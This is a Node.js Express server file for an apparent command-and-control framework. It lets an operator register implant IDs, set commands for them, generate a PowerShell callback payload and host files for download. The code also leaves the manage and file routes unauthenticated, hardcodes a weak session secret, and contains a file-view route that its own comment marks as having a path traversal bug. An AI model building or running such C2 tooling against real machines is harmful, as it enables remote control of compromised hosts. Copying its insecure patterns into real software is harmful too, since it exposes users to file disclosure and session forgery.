//TODO:
//  - Implement response component for payloads to talk back and have the data recorded
//    - handle response and view for users
//  - Clean up the manage page to look good
//  - Create robust payload language definition for commands


const express = require("express");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();
var crypto = require('crypto');
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const sessions = require('express-session');
const fileUpload = require('express-fileupload');

const http_c2 = require('./src/http_c2.js');
const auth = require('./src/auth.js');
const file_upload = require('./src/file_upload.js');
const create_payload = require('./src/create_payload.js');


/**
 * App Variables
 */
var app = express();
const port = process.env.PORT || 8000;

/**
 *  App Configuration
 */

app.set("views", path.join(__dirname, "views"));
app.set("view engine", "pug");
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(sessions({
    // fix secret 
    secret: "111",
    saveUninitialized: true,
    cookie: { 
      maxAge: (1000 * 60 * 60) 
    },
    resave: false 
}));
app.use(fileUpload({
  createParentPath: true
}));


/**
 * Routes Definitions
 */
// page defs 
let main_page = '/list'

var session;
var ids = [];
var files = [];

ids = http_c2.get_list(ids);
files = file_upload.get_files(files);
http_c2.init_session(app);

app.get("/", (req, res) => {
  if (req.session.userid){
    res.redirect(main_page)
  } else {
    res.render("login", { title: "login" });
  }
});

app.get('/login', (req, res) => {res.render("login", { title: "login" });});
app.post('/auth',(req,res) => {
  auth.do_auth(req.body['username'], req.body['password'], res, req);
});

app.get('/manage/create', (req, res) => {
  if (req.session.userid){
    var idValues = http_c2.create_agentid(ids, app);
    app = idValues.app
    ids = http_c2.get_list(ids);
    res.redirect(main_page)
  } else {
    res.redirect("/login")
  }
});

//TODO: Create management page
app.get('/manage/id', (req, res) => {
  let id = req.query.id;
  http_c2.server_get_cmd(id).then(cmd => {
      res.render('manage', { title: "manage", id: id, cur_cmd: cmd})
    });
})

// TODO: function driver needs to be created
app.post('/manage/id/update_cmd', (req, res) => {
  let id = req.body.id;
  let ncmd = req.body.new_cmd
  http_c2.update_cmd(id,ncmd)
  res.redirect('/manage/id?id='+id)
})

app.post('/manage/delete', (req, res) => {
  let id = req.body.id;
  http_c2.del_session(id);
  for (i=0; i < ids.length; i++){
    if (ids[i].id == id){
      ids.splice(i, 1);
      break
    }
  }
  res.redirect(main_page);
})


// fix localhost for prod
app.get('/manage/create/payload', (req, res) => {
  let pType = req.query.payload 
  let id = req.query.id;
  let id_obj = ""
  for(let i of ids){
    if (i.id === id){
      id_obj = i;
      break 
    }
  }

  if (pType = 'basic_ps'){
    app = create_payload.create_basic_ps_payload(id_obj, port, 'localhost', app);
  }
  // stay on the same page
  res.status(204).send();
});

app.get(main_page, (req, res) => {
  if (req.session.userid){
    ids = http_c2.get_list(ids);
    let remove = -1
    for (let i = 0; i < ids.length; i++){
      if (ids[i].id == undefined){
        remove = i;
      }
      if (ids[i].active == 1){
        ids[i].active = true;
      } else {
        ids[i].active = false;
      }
    }
    if (remove >= 0){
      ids.splice(remove, 1)
    }
    res.render('home', {title:'home', page_title:'List', items: ids})
  } else {
    res.redirect('/login');
  }
})

app.get('/manage/files', (req, res) => {
  if (req.session.userid){
    files = file_upload.get_files(files);
    let remove = -1
    for (let i = 0; i < files.length; i++){
      if (ids[i].id == undefined){
        remove = i;
      }
    }
    if (remove >= 0){
      files.splice(remove, 1)
    }
    res.render('files', {title:'files', items: files});
  } else {
    res.redirect('/login');
  }
})

app.get('/manage/files/download', (req, res) => {
  let fname2download = req.query.filename;
  res.download('./uploads/'+fname2download);
})
// Path traversal bug in this function
app.get('/manage/files/view', (req, res) => {
  let fname2download = req.query.filename;
  res.sendFile(path.join(__dirname,'/uploads/'+fname2download));
})

app.get('/manage/files/delete', (req, res) => {
  let fname2del = req.query.filename;
  let remove = -1
  for (let i = 0; i < files.length; i++){
    if (files[i].filename == fname2del){
      remove = i;
    }
  }
  if (remove >= 0){
    files.splice(remove, 1)
  }
  file_upload.delete_file(fname2del);
  res.redirect('/manage/files');
})

app.get('/upload', (req, res) => {
  if (req.session.userid){
    res.render('upload', {title:'upload'})
  } else {
    res.redirect('/login')
  }
});

app.post('/do_upload', async (req, res) => {
  try {
    if(!req.files) {
        res.send({
            status: false,
            message: 'No file uploaded'
        });
    } else {
      let fname = req.files.file_name.name;
      let upload_path = './uploads/'+fname
      let url_v = file_upload.get_url(fname);
      file_upload.update_upload(fname, req.session.userid, url_v, res)
      req.files.file_name.mv(upload_path);
      console.log(url_v)
      app.get(url_v, (req, res) =>{
        res.download(upload_path);
      });
      res.redirect('/manage/files')
    }
  } catch (err) {
	  console.log(err)
    res.status(500).send(err);
  }
});

app.get('/settings', (req, res) => {
  if (req.session.userid){
    res.render('settings', {user: req.session.userid})
  } else {
    res.redirect('/login')
  }
})

app.get('/logout',(req,res) => {
  req.session.destroy();
  res.redirect('/');
});

/**
 * Server Activation -- run with 'npm run dev'
 */
app.listen(port, () => { console.log(`Listening to requests on http://localhost:${port}`); });

